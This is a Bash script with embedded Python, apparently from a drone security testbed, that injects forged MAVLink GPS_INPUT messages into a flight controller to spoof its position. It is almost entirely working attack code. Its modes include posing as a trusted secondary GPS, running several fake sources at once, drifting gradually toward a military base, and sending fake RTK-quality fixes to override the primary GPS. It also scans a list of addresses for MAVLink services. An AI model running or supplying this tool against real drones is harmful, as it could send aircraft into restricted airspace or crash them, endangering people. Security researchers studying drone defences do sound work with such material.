#!/bin/bash
# gps_data_injection_attack.sh - GPS 데이터 주입 공격
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/injection/gps_data_injection_attack.sh
# Purpose: MAVLink GPS_INPUT 메시지를 통한 신뢰할 수 있는 가짜 GPS 데이터 주입

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="GPS Data Injection Attack"

print_attack_banner() {
    echo -e "${CYAN}============================================${NC}"
    echo -e "${CYAN}        GPS Data Injection Attack         ${NC}"
    echo -e "${CYAN}============================================${NC}"
}

execute_gps_injection() {
    local target_host=${1:-"127.0.0.1"}
    local target_port=${2:-"5760"}
    local injection_mode=${3:-"secondary_gps"}
    local duration=${4:-120}
    
    log_info "Starting GPS data injection attack"
    log_info "Target: ${target_host}:${target_port}"
    log_info "Injection mode: ${injection_mode}"
    log_info "Duration: ${duration} seconds"
    
    # Python 스크립트 생성 및 실행
    create_and_run_gps_injection "$target_host" "$target_port" "$injection_mode" "$duration"
    local result=$?
    
    if [ $result -eq 0 ]; then
        log_success "GPS data injection attack completed successfully"
        return 0
    else
        log_error "GPS data injection attack failed"
        return 1
    fi
}

create_and_run_gps_injection() {
    local target_host="$1"
    local target_port="$2"
    local injection_mode="$3"
    local duration="$4"
    
    log_info "Creating and executing GPS data injection attack..."
    
    python3 << PYEOF
from pymavlink import mavutil
import sys
import time
import random
import signal
import threading

class GPSDataInjector:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = int(target_port)
        self.master = None
        self.running = True
        self.injections_sent = 0
        self.start_time = time.time()
        
        # 다양한 가짜 GPS 위치들
        self.injection_locations = {
            "military_base": {
                "name": "Military Base",
                "lat": 385800000,   # 38.58 N (군사 기지)
                "lon": 1270000000,  # 127.0 E
                "alt": 150.0,
                "quality": "high"   # 높은 품질로 신뢰성 증가
            },
            "restricted_zone": {
                "name": "Restricted Airspace",
                "lat": 473566100,   # 47.3566100
                "lon": 854619300,   # 85.4619300
                "alt": 500.0,
                "quality": "high"
            },
            "airport": {
                "name": "International Airport",
                "lat": 377000000,   # 37.7 N (공항)
                "lon": 1266000000,  # 126.6 E
                "alt": 50.0,
                "quality": "excellent"
            },
            "ocean": {
                "name": "Pacific Ocean",
                "lat": 200000000,   # 20.0 N
                "lon": 1500000000,  # 150.0 E
                "alt": 0.0,
                "quality": "medium"
            },
            "foreign_territory": {
                "name": "Foreign Territory",
                "lat": 393900000,   # 39.39 N
                "lon": 1259600000,  # 125.96 E
                "alt": 300.0,
                "quality": "high"
            }
        }
        
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        print(f"\\n[!] Attack interrupted. GPS injections sent: {self.injections_sent}")
        self.stop_injection()
        sys.exit(0)
    
    def connect_to_drone(self):
        """드론에 연결"""
        try:
            connection_string = f'tcp:{self.target_ip}:{self.target_port}'
            print(f"[*] Connecting to {connection_string}...")
            
            self.master = mavutil.mavlink_connection(connection_string)
            
            # 하트비트 대기
            print("[*] Waiting for heartbeat...")
            msg = self.master.wait_heartbeat(timeout=10)
            
            if msg:
                print(f"[+] Connected to drone (System ID: {self.master.target_system})")
                return True
            else:
                print("[-] No heartbeat received")
                return False
                
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def create_gps_input_message(self, location_data, gps_id=1):
        """GPS_INPUT 메시지 생성 (신뢰할 수 있는 보조 GPS로 위장)"""
        
        # 품질에 따른 정확도 설정
        if location_data["quality"] == "excellent":
            hdop = 50   # 매우 좋은 정확도
            satellites = 12
            fix_type = 3  # 3D RTK Fix
        elif location_data["quality"] == "high":
            hdop = 100
            satellites = 10
            fix_type = 3  # 3D Fix
        else:
            hdop = 200
            satellites = 8
            fix_type = 3
        
        return self.master.mav.gps_input_encode(
            time_usec=int(time.time() * 1e6),
            gps_id=gps_id,                    # 보조 GPS ID
            ignore_flags=0,                   # 모든 데이터 사용
            time_week=0,
            time_week_ms=0,
            fix_type=fix_type,
            lat=location_data["lat"],
            lon=location_data["lon"],
            alt=location_data["alt"],
            hdop=hdop,                        # 수평 정확도
            vdop=hdop,                        # 수직 정확도
            vn=0,                            # 북쪽 속도
            ve=0,                            # 동쪽 속도
            vd=0,                            # 하강 속도
            speed_accuracy=50,               # 속도 정확도
            horiz_accuracy=hdop * 10,        # 수평 위치 정확도 (mm)
            vert_accuracy=hdop * 10,         # 수직 위치 정확도 (mm)
            satellites_visible=satellites,   # 보이는 위성 수
            yaw=0                           # 방향각
        )
    
    def inject_secondary_gps(self, location_name, duration):
        """보조 GPS로 위장한 데이터 주입"""
        if location_name not in self.injection_locations:
            print(f"[-] Unknown location: {location_name}")
            return False
        
        location = self.injection_locations[location_name]
        print(f"[*] Injecting GPS data as secondary GPS (ID=1)")
        print(f"[*] Target location: {location['name']}")
        print(f"[*] Coordinates: {location['lat']/1e7:.6f}, {location['lon']/1e7:.6f}")
        print(f"[*] Quality level: {location['quality']}")
        
        while self.running and (time.time() - self.start_time) < duration:
            try:
                # GPS_INPUT 메시지 전송
                msg = self.create_gps_input_message(location, gps_id=1)
                self.master.mav.send(msg)
                
                self.injections_sent += 1
                
                if self.injections_sent % 30 == 0:
                    elapsed = time.time() - self.start_time
                    remaining = duration - elapsed
                    print(f"[*] GPS injection progress: {elapsed:.1f}s/{duration}s, "
                          f"injections sent: {self.injections_sent}, remaining: {remaining:.1f}s")
                
                time.sleep(1)  # 1Hz 주입
                
            except Exception as e:
                print(f"[-] GPS injection error: {e}")
                break
        
        print(f"[+] GPS injection completed: {self.injections_sent} messages sent")
        return True
    
    def inject_multiple_gps_sources(self, duration):
        """다중 GPS 소스 주입 (GPS ID 1, 2, 3)"""
        print("[*] Starting multiple GPS source injection...")
        
        locations = ["military_base", "airport", "foreign_territory"]
        threads = []
        
        for i, location_name in enumerate(locations):
            gps_id = i + 1  # GPS ID 1, 2, 3
            location = self.injection_locations[location_name]
            
            print(f"[*] Starting GPS {gps_id} injection: {location['name']}")
            
            thread = threading.Thread(
                target=self.inject_gps_source,
                args=(location, gps_id, duration)
            )
            thread.daemon = True
            thread.start()
            threads.append(thread)
            
            time.sleep(1)  # 스레드 시작 간격
        
        # 모든 스레드 완료 대기
        for thread in threads:
            thread.join()
        
        print(f"[+] Multiple GPS injection completed")
        return True
    
    def inject_gps_source(self, location_data, gps_id, duration):
        """특정 GPS ID로 데이터 주입"""
        start_time = time.time()
        local_count = 0
        
        while self.running and (time.time() - start_time) < duration:
            try:
                msg = self.create_gps_input_message(location_data, gps_id)
                self.master.mav.send(msg)
                
                local_count += 1
                self.injections_sent += 1
                
                if local_count % 20 == 0:
                    elapsed = time.time() - start_time
                    print(f"[*] GPS {gps_id}: {local_count} injections, {elapsed:.1f}s")
                
                time.sleep(1)
                
            except Exception as e:
                print(f"[-] GPS {gps_id} injection error: {e}")
                break
    
    def inject_gradual_drift(self, start_location, end_location, duration):
        """점진적 위치 이동 주입"""
        print("[*] Starting gradual GPS drift injection...")
        
        start_loc = self.injection_locations[start_location]
        end_loc = self.injection_locations[end_location]
        
        print(f"[*] Drifting from {start_loc['name']} to {end_loc['name']}")
        
        steps = duration  # 1초마다 한 스텝
        lat_step = (end_loc["lat"] - start_loc["lat"]) / steps
        lon_step = (end_loc["lon"] - start_loc["lon"]) / steps
        alt_step = (end_loc["alt"] - start_loc["alt"]) / steps
        
        current_location = {
            "lat": start_loc["lat"],
            "lon": start_loc["lon"],
            "alt": start_loc["alt"],
            "quality": "high"
        }
        
        step_count = 0
        
        while self.running and (time.time() - self.start_time) < duration:
            try:
                # 현재 위치로 GPS 데이터 주입
                msg = self.create_gps_input_message(current_location, gps_id=1)
                self.master.mav.send(msg)
                
                self.injections_sent += 1
                step_count += 1
                
                # 다음 위치로 이동
                current_location["lat"] += lat_step
                current_location["lon"] += lon_step
                current_location["alt"] += alt_step
                
                if step_count % 30 == 0:
                    progress = (step_count / steps) * 100
                    print(f"[*] Drift progress: {progress:.1f}%, "
                          f"current: {current_location['lat']/1e7:.6f}, {current_location['lon']/1e7:.6f}")
                
                time.sleep(1)
                
            except Exception as e:
                print(f"[-] Drift injection error: {e}")
                break
        
        print(f"[+] GPS drift injection completed: {step_count} steps")
        return True
    
    def inject_high_quality_spoofed_gps(self, location_name, duration):
        """고품질 스푸핑된 GPS 데이터 주입"""
        if location_name not in self.injection_locations:
            print(f"[-] Unknown location: {location_name}")
            return False
        
        location = self.injection_locations[location_name]
        print(f"[*] Injecting HIGH QUALITY spoofed GPS data")
        print(f"[*] Target: {location['name']}")
        print(f"[*] Strategy: Appear more reliable than primary GPS")
        
        # 매우 높은 품질로 설정하여 primary GPS보다 신뢰받도록 함
        high_quality_location = location.copy()
        high_quality_location["quality"] = "excellent"
        
        while self.running and (time.time() - self.start_time) < duration:
            try:
                # 매우 정확한 GPS로 위장
                msg = self.master.mav.gps_input_encode(
                    time_usec=int(time.time() * 1e6),
                    gps_id=1,
                    ignore_flags=0,
                    time_week=0,
                    time_week_ms=0,
                    fix_type=6,  # RTK Fixed (최고 품질)
                    lat=location["lat"],
                    lon=location["lon"],
                    alt=location["alt"],
                    hdop=20,     # 매우 좋은 정확도
                    vdop=20,
                    vn=0, ve=0, vd=0,
                    speed_accuracy=10,
                    horiz_accuracy=200,  # 20cm 정확도
                    vert_accuracy=200,
                    satellites_visible=14,  # 많은 위성
                    yaw=0
                )
                
                self.master.mav.send(msg)
                self.injections_sent += 1
                
                if self.injections_sent % 20 == 0:
                    elapsed = time.time() - self.start_time
                    print(f"[*] High-quality injection: {self.injections_sent} messages, "
                          f"{elapsed:.1f}s elapsed")
                
                time.sleep(1)
                
            except Exception as e:
                print(f"[-] High-quality injection error: {e}")
                break
        
        print(f"[+] High-quality GPS injection completed")
        return True
    
    def monitor_gps_switching(self, duration=60):
        """GPS 소스 전환 모니터링"""
        print(f"[*] Monitoring GPS source switching for {duration} seconds...")
        
        start_time = time.time()
        gps_events = []
        
        while (time.time() - start_time) < duration:
            try:
                # GPS 관련 메시지 수신
                msg = self.master.recv_match(type=['GPS_RAW_INT', 'GPS2_RAW', 'GPS_STATUS'], timeout=2)
                
                if msg:
                    msg_type = msg.get_type()
                    
                    if msg_type == 'GPS_RAW_INT':
                        gps_events.append(f"[{time.time():.1f}] GPS1: fix={msg.fix_type}, sats={msg.satellites_visible}")
                        print(f"[*] GPS1: fix_type={msg.fix_type}, satellites={msg.satellites_visible}")
                    
                    elif msg_type == 'GPS2_RAW':
                        gps_events.append(f"[{time.time():.1f}] GPS2: fix={msg.fix_type}, sats={msg.satellites_visible}")
                        print(f"[*] GPS2: fix_type={msg.fix_type}, satellites={msg.satellites_visible}")
                    
                    elif msg_type == 'GPS_STATUS':
                        print(f"[*] GPS Status: satellites used={msg.satellites_used}")
                
            except Exception as e:
                print(f"[-] Monitoring error: {e}")
                break
        
        print(f"[+] GPS monitoring completed: {len(gps_events)} events captured")
        return gps_events
    
    def execute_injection_attack(self, mode, duration):
        """GPS 주입 공격 실행"""
        print(f"[*] Executing GPS injection attack: {mode}")
        
        if mode == "secondary_gps":
            return self.inject_secondary_gps("military_base", duration)
        elif mode == "multiple_sources":
            return self.inject_multiple_gps_sources(duration)
        elif mode == "gradual_drift":
            return self.inject_gradual_drift("airport", "military_base", duration)
        elif mode == "high_quality":
            return self.inject_high_quality_spoofed_gps("foreign_territory", duration)
        elif mode == "monitor":
            self.monitor_gps_switching(duration)
            return True
        else:
            print(f"[-] Unknown injection mode: {mode}")
            return False
    
    def stop_injection(self):
        """주입 공격 중지"""
        self.running = False
        
        if self.master:
            self.master.close()
        
        elapsed = time.time() - self.start_time
        print(f"\\n[+] GPS injection attack completed")
        print(f"    Total injections: {self.injections_sent}")
        print(f"    Duration: {elapsed:.1f} seconds")
        print(f"    Average rate: {self.injections_sent/elapsed:.1f} injections/second")

# 메인 실행 로직
target_ip = "$target_host"
target_port = int("$target_port")
injection_mode = "$injection_mode"
duration = int("$duration")

injector = GPSDataInjector(target_ip, target_port)

try:
    print(f"[*] Starting GPS data injection attack on {target_ip}:{target_port}")
    print(f"[*] Mode: {injection_mode}, Duration: {duration} seconds")
    print(f"[*] Press Ctrl+C to stop attack")
    print("")
    
    if not injector.connect_to_drone():
        print("[-] Failed to connect to drone")
        sys.exit(1)
    
    success = injector.execute_injection_attack(injection_mode, duration)
    
    injector.stop_injection()
    
    if success:
        print(f"\\n[+] GPS data injection attack completed successfully")
        sys.exit(0)
    else:
        print(f"\\n[-] GPS data injection attack failed")
        sys.exit(1)
        
except Exception as e:
    print(f"[-] Attack execution failed: {e}")
    injector.stop_injection()
    sys.exit(1)
PYEOF
    
    return $?
}

# MAVLink 타겟 스캔
scan_mavlink_targets() {
    log_info "Scanning for MAVLink targets..."
    
    local common_targets=(
        "127.0.0.1:5760"
        "127.0.0.1:14550"
        "10.13.0.3:5760"
        "10.13.0.4:14550"
        "192.168.13.1:5760"
        "192.168.1.100:5760"
    )
    
    local found_targets=()
    
    for target in "${common_targets[@]}"; do
        local ip=$(echo "$target" | cut -d':' -f1)
        local port=$(echo "$target" | cut -d':' -f2)
        
        if timeout 3 nc -z "$ip" "$port" 2>/dev/null; then
            found_targets+=("$target")
            echo -e "${GREEN}Found MAVLink service: $target${NC}"
        fi
    done
    
    if [ ${#found_targets[@]} -eq 0 ]; then
        echo -e "${YELLOW}No live MAVLink targets found, using simulation mode${NC}"
        return 1
    fi
    
    return 0
}

# 메인 실행 함수
main() {
    print_attack_banner
    
    if [ "$EUID" -ne 0 ]; then
        log_error "This script must be run as root"
        exit 1
    fi
    
    # 필수 도구 확인
    local required_tools=("python3")
    local missing_tools=()
    
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            missing_tools+=("$tool")
        fi
    done
    
    if [ ${#missing_tools[@]} -gt 0 ]; then
        log_error "Missing required tools: ${missing_tools[*]}"
        exit 1
    fi
    
    # Python 의존성 확인
    if ! python3 -c "import pymavlink" 2>/dev/null; then
        log_info "Installing Python dependencies..."
        pip3 install pymavlink >/dev/null 2>&1
    fi
    
    # 사용자 옵션 처리
    local target_host="${1:-127.0.0.1}"
    local target_port="${2:-5760}"
    local injection_mode="${3:-secondary_gps}"
    local duration="${4:-120}"
    
    # 사용법 출력
    if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
        echo "Usage: $0 [target_host] [target_port] [injection_mode] [duration]"
        echo "  target_host    : Target IP address (default: 127.0.0.1)"
        echo "  target_port    : Target MAVLink port (default: 5760)"
        echo "  injection_mode : GPS injection strategy (default: secondary_gps)"
        echo "  duration       : Attack duration in seconds (default: 120)"
        echo ""
        echo "Injection modes:"
        echo "  secondary_gps     : Inject as secondary GPS (GPS_ID=1)"
        echo "  multiple_sources  : Inject multiple GPS sources simultaneously"
        echo "  gradual_drift     : Gradual position drift injection"
        echo "  high_quality      : High-quality GPS to override primary"
        echo "  monitor          : Monitor GPS source switching"
        echo ""
        echo "Examples:"
        echo "  $0                                    # Secondary GPS injection"
        echo "  $0 10.13.0.3 5760 high_quality 180  # High-quality injection for 180s"
        echo "  $0 127.0.0.1 5760 gradual_drift 300 # Gradual drift for 300s"
        echo "  $0 127.0.0.1 5760 multiple_sources 240 # Multiple GPS sources"
        echo "  $0 127.0.0.1 5760 monitor 60        # Monitor GPS switching"
        echo ""
        echo "Target examples:"
        echo "  10.13.0.3:5760   - Companion Computer"
        echo "  127.0.0.1:5760   - Local SITL"
        echo "  127.0.0.1:14550  - QGroundControl"
        echo ""
        echo "Key differences from GPS Spoofing:"
        echo "  • Uses GPS_INPUT messages (trusted sensor data)"
        echo "  • Appears as legitimate secondary GPS"
        echo "  • Can trigger GPS blending/switching"
        echo "  • Higher trust level than protocol tampering"
        echo "  • Targets EKF state estimation directly"
        exit 0
    fi
    
    # 타겟 스캔 (정보용)
    scan_mavlink_targets
    
    # 공격 실행
    execute_gps_injection "$target_host" "$target_port" "$injection_mode" "$duration"
    exit $?
}

# 직접 실행 시 메인 함수 호출
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi